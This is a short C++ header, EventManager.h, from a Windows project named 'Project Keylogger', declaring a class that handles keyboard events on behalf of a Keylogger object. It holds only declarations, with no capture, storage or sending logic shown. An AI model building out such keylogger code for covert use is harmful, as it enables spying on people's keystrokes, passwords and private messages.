/**
 *					Project Keylogger
 */

#ifndef				_EVENTMANAGER_H
#define				_EVENTMANAGER_H

#include					<Windows.h>
#include					<iostream>

#include					"EventFactory.h"
#include					"Context.h"

class						Keylogger;


class 						EventManager {
public: 
    EventManager(Keylogger&);
	~EventManager();
    void					handleEvent(const WPARAM, const LPARAM) const;
private: 
    Keylogger&				_keylogger;
	struct s_Context*		_context;
};

#endif //_EVENTMANAGER_H